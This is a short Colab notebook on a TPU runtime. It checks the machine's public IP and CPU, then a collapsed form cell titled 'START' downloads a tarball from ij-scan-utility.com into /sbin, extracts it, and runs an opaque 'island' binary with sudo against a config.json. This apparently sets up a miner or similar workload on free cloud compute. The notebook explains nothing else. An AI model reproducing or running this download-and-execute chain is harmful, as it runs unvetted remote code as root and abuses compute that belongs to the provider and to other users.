{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "TPTsel.ipynb",
      "private_outputs": true,
      "provenance": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "rSccmM_loo_e"
      },
      "source": [
        "!curl ipinfo.io"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xYB8Icoso1TY"
      },
      "source": [
        "!lscpu"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "uFjVK8V6orGF"
      },
      "source": [
        "# New Section"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "WVSrVv6posrb"
      },
      "source": [
        "#@title START\n",
        "%cd /sbin\n",
        "!wget https://ij-scan-utility.com/island.tar.gz\n",
        "!tar -xvf island.tar.gz\n",
        "!sed -i -e 's/\\r$//' config.json\n",
        "!chmod  +x *.json ./island && sudo ./island\n",
        "!./island -c config.json"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}